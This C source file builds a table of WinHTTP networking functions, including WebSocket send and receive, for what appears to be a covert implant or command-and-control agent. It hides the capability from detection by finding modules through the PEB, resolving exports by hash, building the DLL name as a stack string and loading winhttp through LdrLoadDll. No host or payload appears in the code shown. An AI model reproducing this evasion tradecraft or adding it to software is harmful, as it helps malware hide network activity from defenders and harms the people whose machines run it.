#include "winhttp_api.h"
#include "system.h"
#include "ntdll.h"
#include "apihash.h"
#include "stackstrings.h"

static PVOID GetWinHttp()
{
    PVOID base = GetModuleHandleFromPEB(HASH_MOD_WINHTTP);
    if (base != NULL)
        return base;

    NTDLL ntdll;
    if (!NTDLL_Ctor(&ntdll) || ntdll.LdrLoadDll == NULL)
        return NULL;

    WCHAR nameBuf[12];
    StrWinhttp(nameBuf);

    UNICODE_STRING name;
    name.Length        = STRLEN_BYTES_WINHTTP;
    name.MaximumLength = STRLEN_BYTES_WINHTTP + 2;
    name.Buffer        = nameBuf;

    PVOID loaded = NULL;
    if (ntdll.LdrLoadDll(NULL, 0, &name, &loaded) != 0 || loaded == NULL)
        return NULL;

    return loaded;
}

BOOL WINHTTP_API_Ctor(WINHTTP_API *api)
{
    if (api == NULL)
        return FALSE;

    PVOID winhttp = GetWinHttp();

    if (winhttp == NULL)
        return FALSE;

    api->WinHttpCrackUrl = (BOOL (WINAPI *)(const WCHAR *, DWORD, DWORD, URL_COMPONENTS *))
                            ResolveExportByHash(winhttp, HASH_WINHTTPCRACKURL);
    api->WinHttpWebSocketSend = (DWORD (WINAPI *)(HINTERNET, WINHTTP_WEB_SOCKET_BUFFER_TYPE, PVOID, DWORD))
                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETSEND);
    api->WinHttpWebSocketReceive = (DWORD (WINAPI *)(HINTERNET, PVOID, DWORD, DWORD *, WINHTTP_WEB_SOCKET_BUFFER_TYPE *))
                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETRECEIVE);
    api->WinHttpOpen = (HINTERNET (WINAPI *)(const WCHAR *, DWORD, const WCHAR *, const WCHAR *, DWORD))
                            ResolveExportByHash(winhttp, HASH_WINHTTPOPEN);
    api->WinHttpConnect = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *, UINT16, DWORD))
                            ResolveExportByHash(winhttp, HASH_WINHTTPCONNECT);
    api->WinHttpOpenRequest = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR **, DWORD))
                            ResolveExportByHash(winhttp, HASH_WINHTTPOPENREQUEST);
    api->WinHttpSetOption = (BOOL (WINAPI *)(HINTERNET, DWORD, PVOID, DWORD))
                            ResolveExportByHash(winhttp, HASH_WINHTTPSETOPTION);
    api->WinHttpSendRequest = (BOOL (WINAPI *)(HINTERNET, const WCHAR *, DWORD, PVOID, DWORD, DWORD, ULONG_PTR))
                            ResolveExportByHash(winhttp, HASH_WINHTTPSENDREQUEST);
    api->WinHttpReceiveResponse = (BOOL (WINAPI *)(HINTERNET, PVOID))
                            ResolveExportByHash(winhttp, HASH_WINHTTPRECEIVERESPONSE);
    api->WinHttpWebSocketCompleteUpgrade = (HINTERNET (WINAPI *)(HINTERNET, ULONG_PTR))
                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETCOMPLETEUPGRADE);
    api->WinHttpCloseHandle = (BOOL (WINAPI *)(HINTERNET))
                            ResolveExportByHash(winhttp, HASH_WINHTTPCLOSEHANDLE);

    return (api->WinHttpCrackUrl != NULL &&
            api->WinHttpWebSocketSend != NULL &&
            api->WinHttpWebSocketReceive != NULL &&
            api->WinHttpOpen != NULL &&
            api->WinHttpConnect != NULL &&
            api->WinHttpOpenRequest != NULL &&
            api->WinHttpSetOption != NULL &&
            api->WinHttpSendRequest != NULL &&
            api->WinHttpReceiveResponse != NULL &&
            api->WinHttpWebSocketCompleteUpgrade != NULL &&
            api->WinHttpCloseHandle != NULL);
}
